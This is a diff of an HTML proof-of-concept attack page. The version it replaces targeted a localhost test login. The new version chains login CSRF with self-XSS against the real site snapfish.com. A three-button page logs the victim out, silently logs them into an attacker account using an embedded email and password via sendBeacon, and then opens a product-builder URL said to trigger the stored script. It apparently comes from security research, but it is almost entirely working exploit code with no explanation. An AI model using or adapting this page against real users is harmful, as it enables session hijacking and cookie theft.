@@ -1,22 +1,40 @@
 <!--Victim will click this-->
 <!DOCTYPE html>
 <html>
+
 <body>
-	<h1>Cookie will be shown in Burp Collaborator</h1>
-	<script type="text/javascript">
-    function step1() {
-      //Log out victim's session
-      navigator.sendBeacon("http://localhost/GoogleLogin/logout.php","");
-      //Log in to attacker account
-      navigator.sendBeacon("http://localhost/GoogleLogin/authLocal.php", new Blob(["username=admin&password=admin"], { type: "application/x-www-form-urlencoded" }))
-      //Open attacker profile to execute  to execute Self XSS 
-      var profileIframe2 = document.createElement('iframe');
-      profileIframe2.setAttribute('src', 'http://localhost/GoogleLogin/index.php');
-      document.body.appendChild(profileIframe2);
-      }
-	</script>	
-  <form action="#">
-    <input type="button" value="Submit request" onclick="step1();" />
-  </form>
+    <script type="text/javascript">
+        function step1() {
+            const handle = window.open("https://www.snapfish.com/logout","_blank");
+            setTimeout(() => {handle.close();}, 5000);
+            
+        }
+
+        function step2(){
+            //Log in to attacker account
+
+            var body = "iwPreActions=submit&pnsUrl=%2Floginto&next=https%253A%252F%252Fwww.snapfish.com%252Fhome%253Floginwith%253Demail&SECURITY_CSRFTOKEN=&SubscriptionFlag=checked&EmailAddress=attackeroqn3vg%40khara.one&Password=NewPassword%212024";
+            var aBody = new Uint8Array(body.length);
+            for (var i = 0; i < aBody.length; i++)
+            aBody[i] = body.charCodeAt(i); 
+
+
+            navigator.sendBeacon("https:\/\/www.snapfish.com\/loginto?submit=true&componentID=1395868004571", new Blob([aBody], { type: "application/x-www-form-urlencoded" }))
+        }
+
+        function step3(){
+            const xss_url = "https://www.snapfish.com/create/builder?sku=CommerceProduct_8987&category=singlesurface&dg=5e1c9ced27404f6cb0f8ab20316047fc&d=f288471511bb497190a02236d9bd37b8&quantity=0&dgcat=mugs_84534_snapfish_us&filters=&sortCriteria=toppicks&productCategory=Gift&projectId=310221507070"
+
+            const handle = window.open(xss_url,"");
+            //setTimeout(() => {handle.close();}, 30000);
+        }
+
+    </script>
+    <form action="#">
+        <input type="button" value="Step 1" onclick="step1();" /> : Logout the Victim <br />
+        <input type="button" value="Step 2" onclick="step2();" /> : Login as the Attacker <br />
+        <input type="button" value="Step 3" onclick="step3();" /> : Load the self XSS page <br />
+    </form>
 </body>
+
 </html>
